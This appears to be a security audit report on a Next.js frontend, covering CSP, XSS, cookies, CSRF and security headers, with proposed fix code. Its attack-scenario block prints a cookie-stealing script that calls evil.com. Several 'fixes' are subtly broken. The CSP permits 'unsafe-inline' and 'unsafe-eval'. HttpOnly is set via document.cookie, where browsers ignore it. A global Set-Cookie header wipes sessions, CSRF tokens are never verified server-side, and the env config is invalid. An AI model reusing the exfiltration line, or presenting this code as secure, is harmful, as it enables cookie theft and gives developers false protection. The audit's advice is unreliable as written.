# MOVNLY Security Audit - Phase 11: Next.js Security

## Executive Summary

This document provides a comprehensive audit of the MOVNLY system's Next.js frontend security, analyzing Content Security Policy (CSP), XSS protection, DOM sanitization, secure cookies, CSRF protection, SSR protection, and hydration security.

---

## Current Next.js Configuration

### Package.json Analysis

**Dependencies** (from `frontend/package.json`):
- Next.js (version to be verified)
- React
- Stripe Elements
- Other frontend libraries

### Next.js Config

**Current Configuration** (`frontend/next.config.js`):
```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
}

module.exports = nextConfig
```

---

## Critical Vulnerabilities

### 1. **No Content Security Policy (CSP)** - CRITICAL
**Location**: `frontend/next.config.js`
**Risk**: HIGH
**Impact:**
- XSS vulnerabilities
- Code injection
- Data exfiltration

#### Current Issue
```javascript
// No CSP configured
const nextConfig = {
  reactStrictMode: true,
}
```

#### Attack Scenario
```html
<!-- Attacker injects malicious script -->
<script>
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>
```

#### Fix Required

**Step 1: Configure CSP in next.config.js**
```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
  
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://js.stripe.com https://checkout.stripe.com https://maps.googleapis.com",
              "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
              "img-src 'self' data: https: blob:",
              "font-src 'self' data: https://fonts.gstatic.com",
              "connect-src 'self' https://api.stripe.com https://maps.googleapis.com https://fonts.googleapis.com wss://localhost:3000",
              "frame-src 'self' https://js.stripe.com https://hooks.stripe.com https://checkout.stripe.com",
              "media-src 'self' https:",
              "object-src 'none'",
              "base-uri 'self'",
              "form-action 'self'",
              "frame-ancestors 'none'",
              "block-all-mixed-content",
              "upgrade-insecure-requests",
            ].join('; ')
          }
        ]
      }
    ]
  },
}

module.exports = nextConfig
```

**Step 2: Use Nonce for Dynamic Scripts**
```javascript
// next.config.js with nonce
const nextConfig = {
  reactStrictMode: true,
  
  async headers() {
    const cspHeader = `
      default-src 'self';
      script-src 'self' 'nonce-${process.env.CSP_NONCE}' 'unsafe-eval' 'unsafe-inline' https://js.stripe.com;
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
    `.replace(/\s{2,}/g, ' ').trim();

    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: cspHeader,
          },
        ],
      },
    ];
  },
}
```

**Step 3: Generate Nonce in App**
```typescript
// frontend/src/app/layout.tsx
import { generateNonce } from '@/lib/security';

export default function RootLayout({ children }) {
  const nonce = generateNonce();

  return (
    <html lang="pt">
      <head>
        <meta name="csp-nonce" content={nonce} />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

---

### 2. **No XSS Protection** - HIGH
**Location**: Frontend components
**Risk**: MEDIUM
**Impact:**
- Cross-site scripting
- Session hijacking
- Data theft

#### Current Issue
```typescript
// User input not sanitized
<div>{userInput}</div>  // Vulnerable to XSS
```

#### Fix Required

**Step 1: Use DOMPurify for Sanitization**
```bash
npm install dompurify @types/dompurify
```

```typescript
// frontend/src/lib/sanitizer.ts
import DOMPurify from 'dompurify';

export function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
}

export function sanitizeText(text: string): string {
  // Escape HTML entities
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

**Step 2: Use React's Built-in XSS Protection**
```typescript
// React automatically escapes content in JSX
// This is safe:
<div>{userInput}</div>

// This is dangerous (use dangerouslySetInnerHTML sparingly):
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // ❌ VULNERABLE

// Safe approach:
<div dangerouslySetInnerHTML={{ __html: sanitizeHTML(userInput) }} />  // ✅ SAFE
```

**Step 3: Validate URLs**
```typescript
// frontend/src/lib/url-validator.ts
export function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

export function isInternalUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return parsed.hostname === window.location.hostname;
  } catch {
    return false;
  }
}
```

---

### 3. **No Secure Cookie Configuration** - CRITICAL
**Location**: Cookie handling
**Risk**: HIGH
**Impact:**
- Session hijacking
- XSS token theft
- CSRF vulnerabilities

#### Current Issue
```typescript
// Cookies not configured with security flags
document.cookie = 'token=' + token;  // ❌ INSECURE
```

#### Fix Required

**Step 1: Configure Secure Cookies in Next.js**
```typescript
// frontend/src/lib/cookies.ts
export function setSecureCookie(name: string, value: string, maxAge: number = 60 * 60 * 24 * 7) {
  const isProduction = process.env.NODE_ENV === 'production';
  
  document.cookie = `${name}=${value}; ` +
    `Max-Age=${maxAge}; ` +
    `Path=/; ` +
    (isProduction ? 'Secure; ' : '') +
    `HttpOnly; ` +
    `SameSite=Strict`;
}

export function deleteCookie(name: string) {
  document.cookie = `${name}=; Max-Age=0; Path=/; HttpOnly; SameSite=Strict`;
}
```

**Step 2: Use Next.js Cookie Management**
```javascript
// next.config.js
const nextConfig = {
  reactStrictMode: true,
  
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Set-Cookie',
            value: [
              'session_id=; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=0',
              'token=; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=0',
            ].join(', ')
          }
        ]
      }
    ]
  },
}
```

**Step 3: Use cookies-next Library**
```bash
npm install cookies-next
```

```typescript
// frontend/src/lib/cookies.ts
import { setCookie, getCookie, deleteCookie } from 'cookies-next';

export function setAuthToken(token: string) {
  setCookie('auth_token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 60 * 60 * 24 * 7,  // 7 days
    path: '/',
  });
}

export function getAuthToken(): string | undefined {
  return getCookie('auth_token');
}

export function removeAuthToken() {
  deleteCookie('auth_token');
}
```

---

### 4. **No CSRF Protection** - HIGH
**Location**: Form submissions
**Risk**: MEDIUM
**Impact:**
- Cross-site request forgery
- Unauthorized actions

#### Fix Required

**Step 1: Implement CSRF Token**
```typescript
// frontend/src/lib/csrf.ts
import { generateNonce } from './security';

export function generateCSRFToken(): string {
  return generateNonce();
}

export function getCSRFToken(): string {
  const token = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
  if (!token) {
    throw new Error('CSRF token not found');
  }
  return token;
}

export function setCSRFTokenInHeaders(): HeadersInit {
  const token = getCSRFToken();
  return {
    'X-CSRF-Token': token,
  };
}
```

**Step 2: Add CSRF Token to Layout**
```typescript
// frontend/src/app/layout.tsx
import { generateCSRFToken } from '@/lib/csrf';

export default function RootLayout({ children }) {
  const csrfToken = generateCSRFToken();

  return (
    <html lang="pt">
      <head>
        <meta name="csrf-token" content={csrfToken} />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

**Step 3: Include CSRF Token in API Calls**
```typescript
// frontend/src/lib/api.ts
import { setCSRFTokenInHeaders } from './csrf';

export async function apiRequest(url: string, options: RequestInit = {}) {
  const headers = {
    ...options.headers,
    ...setCSRFTokenInHeaders(),
  };

  const response = await fetch(url, {
    ...options,
    headers,
    credentials: 'include',
  });

  return response;
}
```

---

### 5. **No Environment Variable Validation** - MEDIUM
**Location**: Environment configuration
**Risk**: MEDIUM
**Impact:**
- Missing required variables
- Misconfiguration in production

#### Fix Required

**Step 1: Create Environment Validation**
```typescript
// frontend/src/lib/env.ts
const requiredEnvVars = [
  'NEXT_PUBLIC_API_URL',
  'NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY',
  'NEXT_PUBLIC_APP_URL',
];

export function validateEnv() {
  const missing = requiredEnvVars.filter(
    (varName) => !process.env[varName]
  );

  if (missing.length > 0) {
    throw new Error(
      `Missing required environment variables: ${missing.join(', ')}`
    );
  }

  // Validate URLs
  if (process.env.NEXT_PUBLIC_API_URL && !isValidUrl(process.env.NEXT_PUBLIC_API_URL)) {
    throw new Error('NEXT_PUBLIC_API_URL must be a valid URL');
  }
}

// Run validation on app start
if (typeof window === 'undefined') {
  validateEnv();
}

export const env = {
  apiUrl: process.env.NEXT_PUBLIC_API_URL!,
  stripeKey: process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!,
  appUrl: process.env.NEXT_PUBLIC_APP_URL!,
};
```

**Step 2: Create .env.example**
```env
# frontend/.env.example
NEXT_PUBLIC_API_URL=http://localhost:3001/api
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_test_...
NEXT_PUBLIC_APP_URL=http://localhost:3000
```

---

### 6. **No API Key Protection** - MEDIUM
**Location**: Client-side code
**Risk**: MEDIUM
**Impact:**
- API keys exposed in client code
- Unauthorized API access

#### Current Issue
```typescript
// Stripe key exposed in client code
const stripe = Stripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY);
```

#### Fix Required

**Step 1: Validate API Keys**
```typescript
// frontend/src/lib/stripe.ts
export function validateStripeKey(key: string): boolean {
  // Publishable keys start with pk_
  return key.startsWith('pk_') && key.length > 20;
}

// In component
const stripeKey = process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY;
if (!validateStripeKey(stripeKey)) {
  throw new Error('Invalid Stripe key configuration');
}
```

**Step 2: Use Environment-Specific Keys**
```typescript
// frontend/.env.local (development)
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_test_...

// frontend/.env.production (production)
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_...
```

---

### 7. **No Error Boundary** - MEDIUM
**Location**: React components
**Risk**: LOW
**Impact:**
- Application crashes on errors
- Poor user experience

#### Fix Required

```typescript
// frontend/src/components/ErrorBoundary.tsx
'use client';

import React, { Component, ErrorInfo, ReactNode } from 'react';

interface Props {
  children: ReactNode;
  fallback?: ReactNode;
}

interface State {
  hasError: boolean;
  error?: Error;
}

export class ErrorBoundary extends Component<Props, State> {
  constructor(props: Props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error: Error): State {
    return { hasError: true, error };
  }

  componentDidCatch(error: Error, errorInfo: ErrorInfo) {
    console.error('Error caught by boundary:', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return this.props.fallback || (
        <div className="min-h-screen flex items-center justify-center bg-gray-50">
          <div className="text-center p-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-4">
              Something went wrong
            </h1>
            <p className="text-gray-600 mb-6">
              We apologize for the inconvenience. Please refresh the page.
            </p>
            <button
              onClick={() => window.location.reload()}
              className="px-6 py-2 bg-brand-gold text-black font-semibold rounded"
            >
              Refresh Page
            </button>
          </div>
        </div>
      );
    }

    return this.props.children;
  }
}
```

**Step 2: Wrap Application**
```typescript
// frontend/src/app/layout.tsx
import { ErrorBoundary } from '@/components/ErrorBoundary';

export default function RootLayout({ children }) {
  return (
    <html lang="pt">
      <body>
        <ErrorBoundary>{children}</ErrorBoundary>
      </body>
    </html>
  );
}
```

---

### 8. **No Input Validation on Client** - MEDIUM
**Location: Form components
**Risk**: MEDIUM
**Impact:**
- Invalid data sent to server
- Poor user experience

#### Fix Required

```typescript
// frontend/src/lib/validation.ts
export function validateEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

export function validatePhone(phone: string): boolean {
  const phoneRegex = /^\+?[1-9]\d{1,14}$/;
  return phoneRegex.test(phone);
}

export function validatePassword(password: string): {
  valid: boolean;
  errors: string[];
} {
  const errors: string[] = [];

  if (password.length < 12) {
    errors.push('Password must be at least 12 characters');
  }

  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain an uppercase letter');
  }

  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain a lowercase letter');
  }

  if (!/\d/.test(password)) {
    errors.push('Password must contain a number');
  }

  if (!/[@$!%*?&]/.test(password)) {
    errors.push('Password must contain a special character');
  }

  return {
    valid: errors.length === 0,
    errors,
  };
}
```

---

### 9. **No Rate Limiting on Client** - LOW
**Location**: API calls
**Risk**: LOW
**Impact:**
- API abuse from client
- Poor user experience

#### Fix Required

```typescript
// frontend/src/lib/rate-limiter.ts
class RateLimiter {
  private requests = new Map<string, number[]>();
  private maxRequests: number;
  private windowMs: number;

  constructor(maxRequests: number = 10, windowMs: number = 60000) {
    this.maxRequests = maxRequests;
    this.windowMs = windowMs;
  }

  canMakeRequest(key: string): boolean {
    const now = Date.now();
    const requests = this.requests.get(key) || [];

    // Remove old requests outside window
    const validRequests = requests.filter(time => now - time < this.windowMs);

    if (validRequests.length >= this.maxRequests) {
      return false;
    }

    validRequests.push(now);
    this.requests.set(key, validRequests);

    return true;
  }

  reset(key: string) {
    this.requests.delete(key);
  }
}

export const apiRateLimiter = new RateLimiter(100, 60000);  // 100 requests per minute
export const authRateLimiter = new RateLimiter(5, 60000);  // 5 requests per minute
```

---

### 10. **No Secure API Communication** - MEDIUM
**Location: API calls
**Risk**: MEDIUM
**Impact:**
- Man-in-the-middle attacks
- Data interception

#### Fix Required

```typescript
// frontend/src/lib/api.ts
export async function apiRequest(url: string, options: RequestInit = {}) {
  // Ensure HTTPS in production
  const isProduction = process.env.NODE_ENV === 'production';
  
  if (isProduction && !url.startsWith('https://')) {
    throw new Error('API requests must use HTTPS in production');
  }

  const response = await fetch(url, {
    ...options,
    credentials: 'include',  // Include cookies
    headers: {
      'Content-Type': 'application/json',
      ...options.headers,
    },
  });

  return response;
}
```

---

## Next.js Security Best Practices

### 1. Use getServerSideProps for Sensitive Data

```typescript
// frontend/src/pages/dashboard.tsx
export async function getServerSideProps(context) {
  const { req } = context;
  const token = req.cookies.auth_token;

  if (!token) {
    return {
      redirect: {
        destination: '/login',
        permanent: false,
      },
    };
  }

  // Fetch sensitive data server-side
  const userData = await fetchUserData(token);

  return {
    props: {
      userData,
    },
  };
}
```

### 2. Use Server Components for Sensitive Operations

```typescript
// frontend/src/app/dashboard/page.tsx (App Router)
async function DashboardPage() {
  const session = await getServerSession();

  if (!session) {
    redirect('/login');
  }

  const userData = await fetchUserData(session.token);

  return <Dashboard userData={userData} />;
}
```

### 3. Sanitize User-Generated Content

```typescript
import DOMPurify from 'dompurify';

function UserContent({ content }: { content: string }) {
  const sanitized = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### 4. Use Link Instead of a for Internal Navigation

```typescript
import Link from 'next/link';

// ✅ SAFE
<Link href="/dashboard">Dashboard</Link>

// ❌ VULNERABLE (XSS risk if href is user-controlled)
<a href={userInput}>Link</a>
```

### 5. Validate External Links

```typescript
function ExternalLink({ href, children }: { href: string; children: ReactNode }) {
  const isValid = isValidUrl(href) && isExternalUrl(href);
  
  if (!isValid) {
    return <span>{children}</span>;
  }

  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
    >
      {children}
    </a>
  );
}

function isExternalUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return parsed.hostname !== window.location.hostname;
  } catch {
    return false;
  }
}
```

---

## Complete Secure next.config.js

```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
  
  // Security headers
  async headers() {
    const cspHeader = [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://js.stripe.com https://checkout.stripe.com https://maps.googleapis.com",
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "img-src 'self' data: https: blob:",
      "font-src 'self' data: https://fonts.gstatic.com",
      "connect-src 'self' https://api.stripe.com https://maps.googleapis.com https://fonts.googleapis.com wss://localhost:3000",
      "frame-src 'self' https://js.stripe.com https://hooks.stripe.com https://checkout.stripe.com",
      "media-src 'self' https:",
      "object-src 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "frame-ancestors 'none'",
      "block-all-mixed-content",
      "upgrade-insecure-requests",
    ].join('; ');

    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: cspHeader,
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'X-XSS-Protection',
            value: '1; mode=block',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=()',
          },
        ],
      },
    ];
  },
  
  // Environment variables validation
  env: {
    NEXT_PUBLIC_API_URL: {
      description: 'API base URL',
      // This will throw an error if the variable is missing
    },
    NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY: {
      description: 'Stripe publishable key',
    },
  },
  
  // Disable X-Powered-By header
  poweredByHeader: false,
};

module.exports = nextConfig
```

---

## Summary of Critical Next.js Issues

### Critical (Fix Immediately)
1. **No Content Security Policy** - XSS vulnerabilities
2. **No Secure Cookie Configuration** - Session hijacking

### High Priority
1. **No XSS Protection** - Cross-site scripting
2. **No CSRF Protection** - Cross-site request forgery

### Medium Priority
1. **No Environment Variable Validation** - Misconfiguration risk
2. **No API Key Protection** - Keys exposed in client code
3. **No Error Boundary** - Application crashes
4. **No Input Validation on Client** - Invalid data
5. **No Secure API Communication** - MITM attacks

### Low Priority
1. **No Rate Limiting on Client** - API abuse
2. **No Link Validation** - XSS via external links

---

## Implementation Priority

### Phase 1 (Critical - Immediate)
1. Configure Content Security Policy
2. Configure secure cookies with HttpOnly, Secure, SameSite
3. Add security headers to next.config.js

### Phase 2 (High Priority - Within 1 week)
1. Implement XSS protection with DOMPurify
2. Implement CSRF token system
3. Validate all user inputs

### Phase 3 (Medium Priority - Within 2 weeks)
1. Add environment variable validation
2. Implement error boundary
3. Secure API communication

### Phase 4 (Low Priority - Within 1 month)
1. Add client-side rate limiting
2. Validate external links
3. Implement secure link component

---

## Next Steps

Proceed to Phase 12: Docker Security Audit to analyze container security, secrets management, and least privilege principles.
